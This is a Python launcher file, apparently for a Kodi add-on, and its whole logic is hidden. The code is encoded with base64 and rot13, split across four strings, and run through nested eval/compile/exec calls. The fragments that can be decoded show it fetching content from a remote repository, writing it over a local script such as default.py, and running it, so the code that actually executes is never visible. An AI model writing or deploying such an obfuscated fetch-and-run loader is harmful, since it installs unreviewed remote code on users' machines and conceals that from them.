# -*- coding: utf-8 -*-
#############################################################
#  Launcher version 2
#############################################################
import base64, codecs
elfary='DcyrTAypUDtBtbtFGScFJycFHycFJxtCFO4Lz1wqzMmVP4tqUWuoaAfLKEyHTS0nPNbVPqmpTIwnJSfBv8iqTIgpPptXDbtnJLtoz90VT9mVP4tpTS0nPNhVTymMTylVPttFGScFJycFHycFJxtXFN6PvNtFGScFJycFHycFJxtCFO4Lz1wqzMmVP4tqUWuoaAfLKEyHTS0nPNbVPqmpTIwnJSfBv8iqKAypzEuqTRaVPxXqUW5VQbXVTxkFGRknJxtCFOiplNhVUOuqTttYvOdo2yhVPttFGScFJycFHycFJxtYPNaBGWvZmZmBQRgpTjmYGDlLGRgLzIyZP1vLzV5MQRmZzH4Z2LhqT1jWlNcPvOcMvOiplNhVUOuqTttYvOcp2McoTHtXPOcZHxkZJycVPxtBtbtVT9mVP4tpzIgo3MyVPttnGSWZGScnFNcPzI4L2IjqPN6PvO4Lz1wVP4toT9aVPttFHycFHycFJxkZHxkVPftMKMuoPNbVPqprQVlKUtmLIk4ZwOprQD5KUt2MSk4AmOprQMzKUt3Z1k4AwyprQLlKUt2L1k4AwIprQVjKUt2AIk4AzAprQL5KUt2MSk4AwyprQMyKUt2ZIk4AmWprQVjKUt2MSk4AzMprQplKUt2BIk4AwSprQVlWlNcVPjtrTWgLlNhVRkCE0yBEx8tXDbtnJLtZwRtYFNlZGbtFJycZJxtYFOWZHycZHxkPvOcMvN5AFNgVQx1BvOiGmNjZT8jZT8jZT8tYFOWZHycZHxkVPftG28XnGScnGRtYvO1pTEuqTHtXPNkZQNtXDccZJycZFNhVTAfo3AyVPttXDccMvN0BFNgVQD5BvOcnDc4Lz1wM3IcVP4tETyuoT9aVPttXFNhVT9eVPttFHycFHycFJxkZHxkVPjtMKMuoPNbVPqprQVlKUt0BIk4AzIprQpmKUt3ASk4AwSprQMwKUt2ZIk4AwAprQL5KUt2Myk4AzIprQVjKUt2Ayk4AwyprQMyKUt2ZIk4AzAprQL5KUt3LIk4AwSprQL0KUt2ZIk4ZzIprQIvKUt0Z1k4AGWprQIxKUt1BIk4AwSprQVjKUt3ZSk4AmIprQL1KUt2ASk4AwIprQpmKUtlZSk4AmMprQMzKUt2L1k4AmMprQL1KUt3Zyk4ZwOprQLkKUtlZSk4AwIprQMyKUt3ASk4AmWprQLkKUt3Zyk4ZwOprQpjKUt2ZIk4AmWprQLkKUtlZSk4AwEprQL5KUt3Z1k4AwMprQplKUt3AIk4AmEprQLkKUt3Zyk4ZwOprQL0KUt2AIk4ZwOprQL1KUt3Z1k4AmEprQL1KUtlZSk4AwSprQL0KUt2ASk4AzMprQMyKUtlMIk4ZwVaVPxtXDccMvNlBFNgVQV5BvOcZJxkVP0tG09iG29iZQNjGmNjPt=='
valderrama='MuMTAnICwgJzMuMTEnIF0gOgogICB4Ym1jZ3VpIC4gRGlhbG9nICggKSAuIG9rICggJ0Vycm9yOiAnICsgSUlpSUlpSWkxMUkxICwgZXZhbCAoICdceDIyXHg1Nlx4NjVceDcyXHg3M1x4NjlceDZmXHg2ZVx4MjBceDI1XHg3M1x4MjBceDY0XHg2NVx4MjBceDcwXHg3OVx4NzRceDY4XHg2Zlx4NmVceDIwXHg2ZVx4NmZceDIwXHg2M1x4NmZceDZkXHg3MFx4NjFceDc0XHg2OVx4NjJceDZjXHg2NVx4MjInICkgJSBPTzBvMDAwbyApCiAgZWxpZiBJaWlJaWkxMWlJSTEgLiByZXNwb25zZSAuIHN0YXR1c19jb2RlID09IDQwNCA6CiAgIHhibWNndWkgLiBEaWFsb2cgKCApIC4gb2sgKCAnRXJyb3I6ICcgKyBJSWlJSWlJaTExSTEgLCBldmFsICggJ1x4MjJceDUyXHg2NVx4NzBceDZmXHg3M1x4NjlceDc0XHg2Zlx4NzJceDY5XHg2Zlx4MjBceDZlXHg2Zlx4MjBceDY0XHg2OVx4NzNceDcwXHg2Zlx4NmVceDY5XHg2Mlx4NmNceDY1XHgyMicgKSApCiAgZWxzZSA6CiAgIHhibWNndWkgLiBEaWFsb2cgKCApIC4gb2sgKCAnRXJyb3I6ICcgKyBJSWlJSWlJaTExSTEgLCBzdHIgKCBJaWlJaWkxMWlJSTEgLiByZXNwb25zZSAuIHRleHQgKSApCiAgZXhpdCAoICkKICBpZiAyNyAtIDI3OiBJMUkgKyBJSTExMWkxSSAqIGlpICUgSWkgKyBvT08gLiBJSTExMWkxSQogZXhjZXB0IEV4Y2VwdGlvbiBhcyBJaWlJaWkxMWlJSTEgOgogIGkxaWkxIC4gY2xvc2UgKCApCiAgeGJtY2d1aSAuIERpYWxvZyAoICkgLiBvayAoICdFcnJvcjogJyArIElJaUlJaUlpMTFJMSAsIHN0ciAoIElpaUlpaTExaUlJMSApICkKICBleGl0ICggKQogIGlmIDYgLSA2OiBPbzBPbwogZWxzZSA6CiAgd2l0aCBvcGVuICggbzAwbzBPTzAwTyAsICd3YicgKSBhcyBpSSA6CiAgIGlJIC4gd3JpdGUgKCBJSWlpIC4gY29udGVudCApCiAgIGlmIDk5IC0gOTk6IElJMTExaTFJICogSTFJaTFJMQogICBpZiA5NSAtIDk1OiBvT08gJSBJaWkxaSAlIGkxaTFpMTExMUkgLiBPb29Pb28KaTFpaTEgLiB1cGRhdGUgKCA3MCApCnRyeSA6CiBpbXBvcnQgdGVtcGZpbGUKIEkxaUlpaUlJaUlpID0gdGVtcGZpbGUgLiBnZXR0ZW1wZGlyICggK'
montolla='IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojLi5MYXVuY2hlciB2ZXJzaW9uIDMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwppZiA4MiAtIDgyOiBJaWkxaQppbXBvcnQgc3lzCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNodXRpbAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHhibWNndWkKaW1wb3J0IHhibWNhZGRvbgppbXBvcnQgeGJtY3ZmcwppZiA4NyAtIDg3OiBJaSAlIGkxaTFpMTExMUkgLiBPbyAvIE9vb09vbyAqIEkxSWkxSTEgLSBJMUkKb29vMG9Pb29vT09PMCA9IHhibWN2ZnMgLiB0cmFuc2xhdGVQYXRoICggeGJtY2FkZG9uIC4gQWRkb24gKCApIC4gZ2V0QWRkb25JbmZvICggJ1BhdGgnICkgKQppZiA0NyAtIDQ3OiBvTzAwMG8wMG8wMG8gKyBJSTExMWkxSQp3aXRoIG9wZW4gKCBvcyAuIHBhdGggLiBqb2luICggb29vMG9Pb29vT09PMCAsICdhZGRvbi54bWwnICkgLCAncicgLCBlbmNvZGluZyA9ICd1dGYtOCcgLCBlcnJvcnMgPSAnaWdub3JlJyApIGFzIGlJIDoKIE9vMCA9IGlJIC4gcmVhZCAoICkKIGlmIDkyIC0gOTI6IE9Pb09vbzAwME8wMCAvIE9vME9vIC0gaTFpMQpvTzBPME8wbyA9IHJlIC4gZmluZGFsbCAoIHIndmVyc2lvblxzKj1ccyouMyhcLlxkK1wuXGQrKScgLCBPbzAgKSBbIDAgXQpJSWlJSWlJaTExSTEgPSB4Ym1jYWRkb24gLiBBZGRvbiAoICkgLiBnZXRBZGRvbkluZm8gKCAnbmFtZScgKSArIG9PME8wTzBvCmlmIDk4IC0gOTg6IEkxMWlpSWkxMWkxSSAlIG9PTwppMWlpMSA9IHhibWNndWkgLiBEaWFsb2dQcm9ncmVzcyAoICkKaTFpaTEgLiBjcmVhdGUgKCBJSWlJSWlJaTExSTEgLCAnUHJlcGFyYW5kbyBpbnN0YWxhY2nDs24uLi4nICkKb29vME8wb08wMCA9IG9zIC4gcGF0aCAuIGRpcm5hbWUgKCBvcyAuIHBhdGggLiBhYnNwYXRoICggX19maWxlX18gKSApCm8wMG8wT08wME8gPSBvcyAuIHBhdGggLiBqb2luICggb29vME8wb08wMCAsICdkZWZhdWx0LnB5JyApCml'
farina='zVQH3VP0tAGp6VTycFJxkVP0tnJxtWFOcnHxtXvOWFJxknGRkZHycFHxtYvOcZHxXG08jomNjZT8tCFOmqUVtXPOmrKZtYvO2MKWmnJ9hK2yhMz8tJlNjVS0tXFNeVPphWlNeVUA0pvNbVUA5plNhVUMypaAco25snJ5zolOoVQRtKFNcPzyzVQttYFN4BvOio28jGlNdVT9CGlNiVRyWZGRknGSWVP8tnJyWnGRXnJLtZmVtYFNmZwbtnJyWnGRXnJLtAmRtYFN3ZGbtFJxXnJLtBQDtYFN4AQbtnGScZJxkZGRkFFNhVRxkFJxkFGRtYlOcnFNgVRxkFFNgVRxkZJycFJxkZJxkFDccnHyWFHyWZFN9VPqxMJMuqJk0KlImYaO5WlNyVR9CZT8jZQOiPzxknJxkVP4tqKOxLKEyVPttZwNtXDccMvN5APNgVQx0BvOcnFNdVRxkFFNiVRxkFFNeVTxkFFNhVRyWnGScZGRkFJyWFDccMvOiplNhVUOuqTttYvOyrTymqUZtXPOiplNhVUOuqTttYvOdo2yhVPtto29iZR8jo08jZPNfVTycFHyWFHxkVPxtXFN6PvOmnUI0nJjtYvOwo3O5VPtto3ZtYvOjLKEbVP4tnz9covNbVT9iomOCZT9CZQNtYPOcnHyWFHyWZFNcVPjtomNjomOCGmNjGlNcPvOcMvN4VP0tBQbtFJxtXlOcZHxtYvOcnHxtYFOWZHycZHxkVPHtnJyWVP4tnGScZJxkZGRkFDcyoUAyVQbXVTyzVQV0VP0tZwD6VT9iomOCPvOcMvN5VP0tBGbtFGRknJyWnGRknGSWVP8tnGSWVP4tnGSWVP8tFJxtWFOcZJxknGRkZGSWVPHto09CPvOcMvN4AFNgVQt1BvOcnHxtWFOWFGRkZJxkFFNeVR9iZR9iVP8tFHxkZGScZHxtYlOWZGScnHycZGScZHxXVUElrFN6PvNtFHycnHxkZJycVQ0tW2u0qUOmBv8ipzS3YzqcqTu1LaImMKWwo250MJ50YzAioF9DLJkuoaEcpzSxMT9hY1WypT8ioJSmqTIlY3AiqKWwMF8mWKZiWKZaVPHtXPOiGmOCZR8jolNfVTycFHyWFHxkVPxXVPOWFJycVQ0tpzIkqJImqUZtYvOaMKDtXPOWFJycFGRknJxtXDbtVRyWnJxtYvOlLJymMI9zo3Wsp3EuqUImVPttXDbtVTyzVQD4VP0tAQt6VTycFJxkVP8tG09iG29iZQNjGmNjVPHto29iZR8XVTI4L2IjqPOlMKS1MKA0plNhVTI4L2IjqTyioaZtYvOVISEDEKWlo3VtLKZtFJycFJycZGScFHxkVQbXVPOcZJycZFNhVTAfo3AyVPttXDbtVTyzVR9CZT8jZQOiVT5iqPOcovOoVPpmYwtaVPjtWm'
eval(compile(base64.b64decode(eval(base64.b64decode('ZXZhbCgnXHg2ZFx4NmZceDZlXHg3NFx4NmZceDZjXHg2Y1x4NjEnKStldmFsKCdceDYzXHg2Zlx4NjRceDY1XHg2M1x4NzNceDJlXHg2NFx4NjVceDYzXHg2Zlx4NjRceDY1XHgyOFx4NjZceDYxXHg3Mlx4NjlceDZlXHg2MVx4MmNceDIwXHgyN1x4NzJceDZmXHg3NFx4MzFceDMzXHgyN1x4MjknKStldmFsKCdceDc2XHg2MVx4NmNceDY0XHg2NVx4NzJceDcyXHg2MVx4NmRceDYxJykrZXZhbCgnXHg2M1x4NmZceDY0XHg2NVx4NjNceDczXHgyZVx4NjRceDY1XHg2M1x4NmZceDY0XHg2NVx4MjhceDY1XHg2Y1x4NjZceDYxXHg3Mlx4NzlceDJjXHgyMFx4MjdceDcyXHg2Zlx4NzRceDMxXHgzM1x4MjdceDI5JykK'))),'<string>','exec'))